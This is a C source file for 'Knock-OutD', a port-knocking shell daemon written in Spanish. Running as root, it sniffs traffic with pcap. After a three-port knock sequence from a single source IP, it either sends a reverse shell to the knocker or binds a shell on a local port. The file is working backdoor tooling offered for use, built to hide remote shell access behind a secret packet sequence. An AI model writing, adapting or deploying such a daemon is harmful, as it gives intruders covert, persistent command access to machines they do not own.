/*
 * Knock-OutD - Programa Servidor
 *
 * nitr0us
 *
 */
#include"knock-out.h"
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include<netinet/ip.h>
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include<netinet/tcp.h>
#include<netinet/udp.h>
#include<netinet/if_ether.h>
#include<pcap.h>
#include<setjmp.h>

#define LCOOKEDSIZE	sizeof(struct lcooked_hdr)
#define IPSIZE		sizeof(struct ip)
#define TCPSIZE		sizeof(struct tcphdr)

void callback(u_char *, const struct pcap_pkthdr *, const u_char *);

config_t	configuracion;
static int	stage = 0;
jmp_buf		pila;
pcap_t		*hand;

int main(int argc, char **argv)
{
	char			filtro[128], errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program	compilado;
	bpf_u_int32		ip, netmask;

	if(getuid() != (uid_t) 0){
		fprintf(stderr, "Necesitas privilegios de root(uid=0)\n");
		exit(EXIT_FAILURE);
	}

	if(argc < 3)
		uso(*argv);

	signal(SIGINT, interrupcion);
	signal(SIGALRM, alarma);
	signal(SIGHUP, recargar_config);

	/** ENCABEZADO **/
	printf("-=[-----------------------------------------]=-\n");
	printf("-=[-- Knock-Outd : Portknock shell Daemon --]=-\n");
	printf("-=[-----------------------------------------]=-\n");
	printf("-=[----- Por: A. Alejandro Hernandez^2 -----]=-\n");
	printf("-=[---- nitrousenador[en]gmail[punto]com ---]=-\n");
	printf("-=[--------------=[ nITROUs ]=--------------]=-\n");
	printf("-=[-----------------------------------------]=-\n");
	printf("-=[---------- Mexico - 21/Jul/06 -----------]=-\n");
	printf("-=[-----------------------------------------]=-\n\n");
	/** ENCABEZADO **/

	debugprint("<===== CONFIGURACION =====>\n");
	setjmp(pila);
	Parsear_configuracion(argv[1], &configuracion);
	debugprint("Configuracion [OK]\n");

	debugprint("<===== PCAP =====>\n");
	debugprint("Interface: %s\n", argv[2]);
	if((hand = pcap_open_live(argv[2], BUFSIZ, 1, -1, errbuf)) == NULL)
		error("pcap_open_live(): %s\n", errbuf);
	debugprint("pcap_open_live(): [OK]\n");
	if(pcap_lookupnet(argv[2], &ip, &netmask, errbuf) == -1)
		error("pcap_lookupnet(): %s\n", errbuf);
	debugprint("pcap_lookupnet(): [OK]\n");
	snprintf(filtro, 128, "dst host %s and %s dst port %u or %u or %u",\
				obtener_ip_disp(argv[2]),\
				configuracion.proto,\
				configuracion.sec1,\
				configuracion.sec2,\
				configuracion.sec3);
	debugprint("Filtro: \"%s\"\n", filtro);
	if(pcap_compile(hand, &compilado, filtro, 0, ip) == -1){
		fprintf(stderr, "pcap_compile()\n");
		exit(EXIT_FAILURE);
	}
	debugprint("pcap_compile(): [OK]\n");
	if(pcap_setfilter(hand, &compilado) == -1){
		fprintf(stderr, "pcap_setfilter()\n");
		exit(EXIT_FAILURE);
	}
	debugprint("pcap_setfilter(): [OK]\n");

	debugprint("<===== PORTKNOCK =====>\n");
	pcap_loop(hand, -1, callback, NULL);

	fprintf(stdout, "pcap_loop(): Terminando...\n");
	exit(EXIT_SUCCESS);
}

void uso(char *prog)
{
	char		errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t	*dispositivos, *ifptr;
	pcap_addr_t	*addrptr;

	fprintf(stderr, "Uso: %s <archivo_de_configuracion> <interfaz>\n", prog);
	fprintf(stderr, "Interfaces disponibles: \n");
	fprintf(stderr, "\tNombre\tDireccion(es)\t\tDescripcion\n");

	if(pcap_findalldevs(&dispositivos, errbuf) == -1)
		error("pcap_findalldevs(): %s\n", errbuf);
	else{
		for(ifptr = dispositivos; ifptr; ifptr = ifptr->next){
			if(stringcomp("any", ifptr->name))
					continue;

			printf("\t%s\t", ifptr->name);

			for(addrptr = ifptr->addresses; addrptr; addrptr = addrptr->next)
				if(addrptr->addr)
					if(addrptr->addr->sa_family == AF_INET)
						printf("%s ", inet_ntoa(((struct sockaddr_in *) addrptr->addr)->sin_addr));

			printf("\t\t%s\n", ifptr->description ? ifptr->description : ifptr->flags & PCAP_IF_LOOPBACK ? "Interfaz Loopback" : " ");
		}

		pcap_freealldevs(dispositivos);
	}

	exit(EXIT_FAILURE);
}

void interrupcion(int signum)
{
	debugprint("Senal recibida [%d]: %s\n", signum, sys_siglist[signum]);
	debugprint("Saliendo...\n");

	pcap_close(hand);

	exit(EXIT_SUCCESS);
}

void callback(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
	char			dlink;
	u_int8_t		dlink_offset;
	static char		srcipanterior[20], srcipactual[20];
	struct lcooked_hdr	*LCOOKED;	// Enlace de datos
	struct ether_header	*ETHER;		// Enlace de datos
	struct ip		*IP;		// Red
	struct udphdr		*UDP;		// Transporte
	struct tcphdr		*TCP;		// Transporte

	switch(dlink = pcap_datalink(hand)){
		case DLT_EN10MB:	/* Ethernet */
			ETHER = (struct ether_header *) packet;
			if(ntohs(ETHER->ether_type) == ETHERTYPE_IP){
				dlink_offset = ETHER_HDR_LEN;
				break;
			} else
				return;
		case DLT_LINUX_SLL:
			LCOOKED = (struct lcooked_hdr *) packet;
			if(ntohs(LCOOKED->proto) == ETHERTYPE_IP){
				dlink_offset = LCOOKEDSIZE;
				break;
			} else
				return;
		default:
			fprintf(stderr, "Enlace de Datos no soportado: %s = %s\n",\
					pcap_datalink_val_to_name(dlink),\
					pcap_datalink_val_to_description(dlink));
			fprintf(stderr, "Contactame... nitrousenador[en]gmail[punto]com\n");

			pcap_close(hand);
			exit(EXIT_SUCCESS);
	}

	IP  = (struct ip *) (packet + dlink_offset);
	TCP = (struct tcphdr *) (packet + dlink_offset + IPSIZE);
	UDP = (struct udphdr *) (packet + dlink_offset + IPSIZE);
	strncpy(srcipactual, (const char *) inet_ntoa(IP->ip_src), 20);

	switch(stage){
		case 0:
			if(stringcomp("tcp", configuracion.proto)){
				if(ntohs(TCP->th_dport) == configuracion.sec1){
					if(FLAGS_VALIDAS(TCP->th_flags))
						goto nivel1_alcanzado;
					else
						debugprint("%s envio Flags invalidas en NIVEL1: 0x%x\n", srcipactual, TCP->th_flags);
				}
				break;
			} else{ /* udp */
				if(ntohs(UDP->uh_dport) == configuracion.sec1)
					goto nivel1_alcanzado;

				break;

			}
nivel1_alcanzado:
			debugprint("NIVEL1 alcanzado. %s toco el puerto %d\n",\
					srcipactual,\
					configuracion.sec1);

			strncpy(srcipanterior, srcipactual, 20);
			stage++;

			alarm((unsigned int) configuracion.timeout);
			break;
		case 1:
			if(!stringcomp(srcipanterior, srcipactual)){
				debugprint("Diferentes IPs fuentes entre los niveles 1 y 2\n");
				debugprint("IP NIVEL1: %s\n", srcipanterior);
				debugprint("IP NIVEL2: %s\n", srcipactual);
				debugprint("Reseteando puertos... Toque nuevamente\n");

				stage = 0;
				break;
			} else if(stringcomp("tcp", configuracion.proto)){
				if(ntohs(TCP->th_dport) == configuracion.sec2){
					if(FLAGS_VALIDAS(TCP->th_flags))	
						goto nivel2_alcanzado;
					else{
						alarm(0); // Eliminar timeout pendiente
						debugprint("%s envio Flags invalidas en NIVEL2: 0x%x\n", srcipactual, TCP->th_flags);
						debugprint("Reseteando puertos... Toque nuevamente\n");
						stage = 0;
					}
				}
				break;
			} else{ /* udp */
				if(ntohs(UDP->uh_dport) == configuracion.sec2)
					goto nivel2_alcanzado;

				break;
			}
nivel2_alcanzado:
			alarm(0); // Eliminar timeout pendiente
			debugprint("NIVEL2 alcanzado. %s toco el puerto %d\n",\
					srcipactual,\
					configuracion.sec2);

			strncpy(srcipanterior, srcipactual, 20);
			stage++;

			alarm((unsigned int) configuracion.timeout);
			break;
		case 2:
			if(!stringcomp(srcipanterior, srcipactual)){
				debugprint("Diferentes IPs fuentes entre los niveles 2 y 3\n");
				debugprint("IP NIVEL2: %s\n", srcipanterior);
				debugprint("IP NIVEL3: %s\n", srcipactual);
				debugprint("Reseteando puertos... Toque nuevamente\n");

				stage = 0;
				break;
			} else if(stringcomp("tcp", configuracion.proto)){
				if(ntohs(TCP->th_dport) == configuracion.sec3){
					if(FLAGS_VALIDAS(TCP->th_flags))
						goto nivel3_alcanzado;
					else{
						alarm(0); // Eliminar timeout pendiente
						debugprint("%s envio Flags invalidas en NIVEL3: 0x%x\n", srcipactual, TCP->th_flags);
						debugprint("Reseteando puertos... Toque nuevamente\n");
						stage = 0;
					}
				}
				break;
			} else{ /* udp */
				if(ntohs(UDP->uh_dport) == configuracion.sec3)
					goto nivel3_alcanzado;

				break;
			}
nivel3_alcanzado:
			alarm(0); // Eliminar timeout pendiente
			debugprint("NIVEL3 alcanzado. %s toco el puerto %d\n",\
					srcipactual,\
					configuracion.sec3);

			if(stringcomp("reverse", configuracion.metodo)){
				debugprint("Enviando shell a %s en el puerto %d\n",\
					srcipactual, configuracion.puerto);
				debugprint("<===== REVERSE =====>\n");
				Reverse(srcipactual, configuracion.puerto);
			} else{
				debugprint("Bindeando shell en el puerto local %d/tcp\n",\
					configuracion.puerto);
				debugprint("<===== BIND =====>\n");
				Bind(configuracion.puerto);
			}

			debugprint("<===== PORTKNOCK =====>\n");
			stage = 0;
	}
}

void alarma()
{
	debugprint("Timeout !\n");
	debugprint("Reseteando puertos... Toque nuevamente\n");

	stage = 0;
}

void recargar_config(int signum)
{
	debugprint("Senal recibida [%d]: %s\n", signum, sys_siglist[signum]);
	debugprint("Recargando archivo de configuracion...\n");

	longjmp(pila, 1);
}

char *obtener_ip_disp(const char *disp)
{
	char		errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t	*dispositivos, *ifptr;
	pcap_addr_t	*addrptr;

	if(pcap_findalldevs(&dispositivos, errbuf) == -1)
		error("pcap_findalldevs() @ obtener_ip_disp: %s\n", errbuf);
	else{
		for(ifptr = dispositivos; ifptr; ifptr = ifptr->next)
			if(stringcomp(disp, ifptr->name))
				for(addrptr = ifptr->addresses; addrptr; addrptr = addrptr->next)
					if(addrptr->addr)
						if(addrptr->addr->sa_family == AF_INET)
							return ((char *) inet_ntoa(((struct sockaddr_in *) addrptr->addr)->sin_addr));

		pcap_freealldevs(dispositivos);
		return NULL;	// No direcciones encontradas
	}
}
